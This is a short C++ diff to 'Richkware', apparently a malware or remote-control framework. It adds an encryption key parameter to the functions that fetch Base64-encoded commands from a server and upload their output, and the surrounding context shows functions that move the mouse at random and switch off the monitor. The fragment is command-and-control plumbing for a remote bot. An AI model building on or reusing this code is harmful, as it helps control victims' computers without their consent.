@@ -90,8 +90,8 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
-std::vector<std::string> Richkware::getCommands() {
-    std::string commands = network.fetchCommand();
+std::vector<std::string> Richkware::getCommands(const std::string &encryptionKey) {
+    std::string commands = network.fetchCommand(encryptionKey);
     std::string decodedCommands = Base64_decode(commands);
     std::vector<std::string> commandList;
     std::vector<std::string> result;
@@ -133,8 +133,8 @@ void Richkware::Hibernation() {
                 SC_MONITORPOWER, (LPARAM) 2);
 }
 
-void Richkware::uploadCommandsResponse(std::string output) {
-    network.uploadCommand(output);
+void Richkware::uploadCommandsResponse(std::string output, const std::string &encryptionKey) {
+    network.uploadCommand(output, encryptionKey);
 }
 
 
